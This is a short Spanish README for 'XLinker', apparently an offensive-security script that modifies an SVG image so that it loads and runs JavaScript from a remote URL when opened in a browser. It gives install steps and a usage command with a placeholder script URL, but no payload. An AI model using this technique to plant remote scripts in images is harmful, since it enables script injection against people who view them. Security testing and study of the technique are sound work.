# XLinker
### Agrega scripts que se carguen remotamente desde una URL a una imagen SVG.

Una imagen SVG es una imagen vectorial con un formato XML,
a estas imágenes se les pueden agregar animaciones via JavaScript,
pero desde el punto de vista de la ciberseguridad lo más divertido
es poder cargar estos scripts de forma dinámica desde un lugar remoto.

Este script modifica la imagen especificada agregándole una solicitud
a un script alojado en la URL especificada.

Cuando la imagen sea cargada en un navegador se realizará una petición al recurso
especificado y se realizarán las instrucciones JS especificadas.

## Instalación

### Instalación de dependencias
apt-get install libxml2-dev libxslt-dev

### Liberías de Python empleadas
pip3 install -r < requirements.txt

## Modo de uso

python3 xlinker.py /ruta/del/documento/svg http://dominio_donde_este_alojado_el/script.js

![Modo de uso](https://raw.githubusercontent.com/HoneySEC/scripts/master/svg/xlinker/demo/photo/usage.png)

### Ejemplo de funcionamiento
![Ejemplo de funcionamiento(https://raw.githubusercontent.com/HoneySEC/scripts/master/svg/xlinker/demo/photo/demo.png)
